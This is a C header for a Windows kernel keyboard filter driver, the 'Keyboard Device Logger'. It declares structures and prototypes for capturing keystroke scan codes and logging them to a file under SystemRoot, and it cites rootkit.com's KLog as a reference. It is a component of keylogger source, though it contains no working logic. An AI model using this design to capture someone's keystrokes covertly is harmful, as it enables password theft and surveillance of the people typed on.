/*
 *   Keyboard Device Logger
 *   Copyright (C) 2005 Jason Todd
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *
 *   This is a simple keyboard device filter that attaches itself to the kbclass
 *   and gleams scan codes from the IRP as they pass up the stack.
 *
 *   This file handles all the WDM related functions.
 *
 *   REFERENCE for this code :
 *    Programing the Microsoft Windows Driver Model - Walter Oney : ISBN 0-7356-1803-8
 *    kbfilter.c - DDK
 *    Ctrl2Cap 2.0 - http://www.sysinternals.com/
 *    KLog 1.0 - http://www.rootkit.com/
 */

#ifndef __KDL_H__
#define __KDL_H__

#include "ntddk.h"
#include "ntddkbd.h"

// Default log file name and placement
#define DEFAULT_LOG_FILE   L"\\SystemRoot\\kdl"
// Default Value for our linked list buffer size till we write to disk
#define DEFAULT_MAX_LIST_SIZE  50
/* STRING_FORMAT is used here to align key data, we set this up here because the memory used by
 *WriteBuffer is dependant on this data. Since the value will be in hex for this example
 we can use strlen(STRING_FORMAT) to give us the size of each string parsed key data entry
 that we need to place into *WriteBuffer. If this value changes you will need to change the 
 ExAllocatePoolWithTag in LogThreadFunc() and RtlZeroMemory() to match your new possible 
 sizes from the new format. Minor changes can be made to this ( why it is a define ) without
 breaking the code in LogThreadFunc() but it must bend the rules, not break them.
 */
#define STRING_FORMAT "%x:%d "

 
UNICODE_STRING    gRegistryPath;


typedef struct _DEVICE_EXTENSION {

  PDEVICE_OBJECT           thisDeviceObject;     // Self reference to our DeviceObject
  PDEVICE_OBJECT           LowerDeviceObject;    // Device Object below this one
  PDEVICE_OBJECT           PhysicalDeviceObject; // Physical Device Object we are attached too

  BOOLEAN                  ActiveLogThread;      // Is our logging thread active?
  PETHREAD                 LoggingThread;        // Logging file thread

  HANDLE                   LogFile;				 // File Handle for log file

  KSEMAPHORE               Semaphore;            // LoggingThread Comunication
  KSPIN_LOCK               SpinLock;             // Key Data List Acess protection

  LIST_ENTRY               ListHead;             // Entry point for linked list of key data

  PNPAGED_LOOKASIDE_LIST   LookList;             // Look aside list for key data

  USHORT                   CurrentListSize;      // Current Size of the linked list - If I knew an internal call to the
                                                 // list to be able to determine its size would prefer to use it
  ULONG                    MaxListSize;          // Maximum entries before we write the buffer to disk

  char                     *WriteBuffer;         // Working string buffer for linking string key data

  USHORT                   BufferMark;           // Position marker to where we are at in the WriteBuffer

  LARGE_INTEGER            theEOF;

} DEVICE_EXTENSION, *PDEVICE_EXTENSION;


typedef struct _KEY_DATA {

  LIST_ENTRY   ListEntry;   // DDK : "describes an entry in a doubly-linked list, or 
                            // serves as the header for such a list"
  USHORT       KeyUnitId;   // ntddkbd.h : "Unit number.  E.g., for \Device\KeyboardPort0 
                            // the unit is '0', for \Device\KeyboardPort1 the unit is '1'."
  USHORT       KeyMakeCode; // ntddkbd.h : "The "make" scan code (key depression)."

  USHORT       KeyFlags;    // ntddkbd.h : "The flags field indicates a "break" (key release) 
                            // and other miscellaneous scan code information defined below."
} KEY_DATA, *PKEY_DATA;


#if WINVER == 0x0500
// Macro so win2k will not choke
#define ExFreePoolWithTag( a, b ) ExFreePool( (a) )
#endif

// Memory tags
#define POOL_TAG_LOOKLIST               'pLaL'
#define POOL_TAG_INITLOOKLIST           'iLaL'

#define POOL_TAG_GREGISTRY              'geRg'
#define POOL_TAG_REGISTRY_STORAGE_KEY   'geRf'
#define POOL_TAG_REGISTRY_STORAGE       'geRf'
#define POOL_TAG_REGISTRY_MAXLIST       'yeKm'

#define POOL_TAG_WRITEBUFFER            'ffuB'


/* Prototypes */

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath );

NTSTATUS KDL_DispatchShutdown( IN PDEVICE_OBJECT theDeviceObject, IN PIRP theIRP );

VOID KDL_DriverUnload( IN PDRIVER_OBJECT DriverObject );

NTSTATUS KDL_AddDevice( IN PDRIVER_OBJECT theDriverObject, IN PDEVICE_OBJECT thePhysicalDeviceObject );

NTSTATUS KDL_DispatchPassThrough( IN PDEVICE_OBJECT DeviceObject, IN PIRP theIRP );
NTSTATUS KDL_DispatchPower( IN PDEVICE_OBJECT DeviceObject, IN PIRP theIRP );
NTSTATUS KDL_DispatchPNP( IN PDEVICE_OBJECT DeviceObject, IN PIRP theIRP );

NTSTATUS KDL_DispatchRead( IN PDEVICE_OBJECT theDeviceObject, IN PIRP theIRP );
NTSTATUS KDL_ReadComplete( IN PDEVICE_OBJECT theDeviceObject, IN PIRP theIRP, IN PVOID Context );

#endif